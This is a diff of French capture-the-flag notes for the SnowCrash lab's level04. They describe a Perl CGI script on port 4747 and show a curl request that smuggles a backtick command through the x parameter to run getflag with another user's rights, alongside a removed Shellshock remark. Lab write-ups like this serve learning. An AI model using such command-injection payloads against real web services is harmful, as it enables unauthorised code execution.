@@ -12,14 +12,9 @@ dr-xr-x---+ 2 flag12 level12  60 Jun 15 09:31 level12
 
 => le script perl print le parametre x d'une requete GET sur le port 4747 du serveur
 curl http://192.168.56.2:4747?x=12
+12
 
-=> la version de bash est exploitable par shellshock :
-level04@SnowCrash:~$ echo $BASH_VERSION
-4.2.25(1)-release
 
-# exploit d'un script perl utilisant les CGI : 
-https://www.perl.com/article/115/2014/9/26/Shellshock-and-Perl/
-https://www.exploit-db.com/docs/english/48112-the-shellshock-attack-%5Bpaper%5D.pdf?utm_source=dlvr.it&utm_medium=twitter
 
 # le script perl est executé avec les droits de flag04 : -r-xr-x---+ 1 flag04 level04 152 Jun 19 14:18 level04.pl
 la commande : curl localhost:4747?x=\`getflag\` execute getflag en tant que flag04
